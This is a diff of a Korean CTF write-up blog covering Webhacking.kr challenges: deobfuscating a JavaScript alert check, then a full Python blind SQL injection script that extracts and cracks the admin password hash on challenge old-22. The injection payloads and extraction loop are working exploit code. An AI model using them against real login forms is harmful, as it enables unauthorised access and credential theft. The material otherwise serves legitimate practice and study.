@@ -346,6 +346,39 @@ function H(I) {
 
 웹 페이지에서 이런게 떠있었는데 잠시 보류
 
+## writeup
+
+'22.06.27
+{: .text-red-000 }
+
+감이 전혀 오질 않아서 `alert` 라는 키워드의 힌트를 얻었다.
+
+![image-20220627170646792](../img/image-20220627170646792.png)
+
+저 많은 코드를 일일히 분석하는 것은 말도 안되기에 페이지 처음 접속 시 확인할 수 있었던 alert 함수를 찾아보기로 했었다. 그리고 위 사진처럼 찾았는데 조건문에 의해서 알림창이 발생하는 것을 볼 수 있다.
+
+```javascript
+if (location[b('0x19', 'iUmC')][b('0x1a', '6]r1')](0x1) == b('0x1b', 'RLUb')) location[b('0x1c', '4c%d')] = b('0x1d', 'llaF');
+else alert(b('0x1e', '14cN'));
+```
+
+그럼 이 코드를 다 분석해보자.
+
+![image-20220627171039727](../img/image-20220627171039727.png)
+
+번역하면
+
+```javascript
+if (location['hash']['slice'](0x1) == 'Passw0RRdd') location['href'] = './?Passw0RRdd=1';
+else alert('debug me');
+```
+
+결국에 알림창이 아니면 저 페이지로 로드된다는 의미인 것 같다.
+
+![image-20220627171117953](../img/image-20220627171117953.png)
+
+힌트없이 풀지못한게 너무 아쉽다.
+
 <br><br><br>
 
 -----
@@ -652,7 +685,7 @@ console.log(String.fromCharCode(enco_(240))+String.fromCharCode(enco_(220))+Stri
 
 풀 수 있었다. 참고로 바보같이 값을 `?`없이 전달해서 이런 삽질도 했다 ^^
 
-![image-20220619151249035](img/image-20220619151249035.png)
+![image-20220619151249035](../img/image-20220619151249035.png)
 
 <br><br><br>
 
@@ -706,9 +739,109 @@ lv5frm.submit();
 
 # > Webhacking.kr:old-22(laptop)
 
-## writeup
+## 삽질
 
 낮은 문제들부터 푸는중
+
+'22.06.27
+{: text-red-000}
+
+![image-20220627171332878](../img/image-20220627171332878.png)
+
+"admin" 계정으로 로그인하는게 목표인듯한데, 컬럼명을 알려주는 것으로 봐서 적절한 쿼리문을 날려야 할 듯하다.
+
+![image-20220627171530381](../img/image-20220627171530381.png)
+
+join 메뉴로 가입을 하여 로그인을 하면 해당 계정 비밀번호의 해쉬값을 알려준다. 
+
+전달되는 쿼리문을 아래라고 예상하고 적절한 쿼리문을 테스트해보기로 했다.
+
+```mysql
+SELECT * FROM userinfo WHERE id = {uid} and pw = {upw};
+```
+
+![image-20220627212219592](../img/image-20220627212219592.png)![image-20220627212230646](../img/image-20220627212230646.png)
+
+`or 1#`부터 시작해서 `admin' or 1=1#` 등등 뭐든지 나오라는 형식으로 계속 넣었다. 그리고 그 결과로 로그인을 시도했을 때 그 반응의 경우가 총 3개임을 알았다.
+
+![image-20220627212702977](../img/image-20220627212702977.png)
+
+아마도 ID 검사 이후에 비밀번호도 검사하는 루틴이 존재하는 듯한데, 참의 존재를 판별할 수 있는 "Wrong password!" 경우 덕분에 Blind Injection이 가능할 것 같다. ID 란에서 비밀번호를 찾아가는 쿼리를 던지면서 "Fail"은 거짓, "Wrong"은 참으로 인식하면 되겠다.
+
+<br>
+
+## writeup
+
+```python
+import requests
+cookie = {'PHPSESSID':'reikne9qst09rsuof44ggfcnsb'}
+
+def my_request(uid : str,upw : str):
+	url = f'https://webhacking.kr/challenge/bonus-2/'
+	params = {
+		'uuid':uid,
+		'pw':upw
+	}
+	response = requests.post(url=url,data=params,cookies=cookie)
+	return response
+
+
+def find_pw_len():
+	for cnt in range(1,50):
+		uid = f'admin\' and length(pw)>{cnt}#'
+		upw = '1'
+		response = my_request(uid,upw)
+		if "Fail" in response.text:
+			print("I get password's len:",cnt)
+			break
+	return cnt
+
+
+def find_pw(pw_len):
+	print("Now, I will find pw")
+	res = ""
+	for cnt in range(1,pw_len+1):
+		for c in range(0x2f,0x7e):
+			uid = f'admin\' and left(pw,{cnt})=\'{res}'+chr(c)+'\'#'
+			upw = '1'
+			response = my_request(uid,upw)
+			if "Wrong" in response.text:
+				print("[!] {}'s char:{}".format(cnt,chr(c)))
+				res += chr(c)
+				break
+	return res
+
+def solve():
+	pw_len = find_pw_len()
+	res = find_pw(pw_len)
+	print(res)
+
+if __name__ == "__main__":
+	solve()
+```
+
+한 두번 하다보니 이제 웹을 위한 익스코드도 생각보다 짤만한 것 같다.
+
+![image-20220627220606194](../img/image-20220627220606194.png)
+
+근데 이렇게 얻었는데 딱봐도 해시값처럼 생긴 비밀번호가 나왔다. 당연히 비밀번호란에 넣어도 로그인될 수가 없었고, md5 복호화 사이트를 찾아보기로 했다.
+
+![image-20220627220749381](../img/image-20220627220749381.png)
+
+"wowapple" 이라는 정보를 얻었고 이를 넣었다.
+
+근데 안된다. 뭐지 뭘까 뭐야!
+
+id가 "test"이고 pw가 "test"인 계정을 만들고 해당 해시값을 복호화했더니
+
+![image-20220627221412967](../img/image-20220627221412967.png)
+
+암호화가 틀렸나 했는데 알고보니 salt 값으로 "apple"이 추가된거였다. 진짜 문제가 발악(?)을 하는구만!
+
+![image-20220627221504975](../img/image-20220627221504975.png)
+
+
+## 
 
 <br><br><br>
 
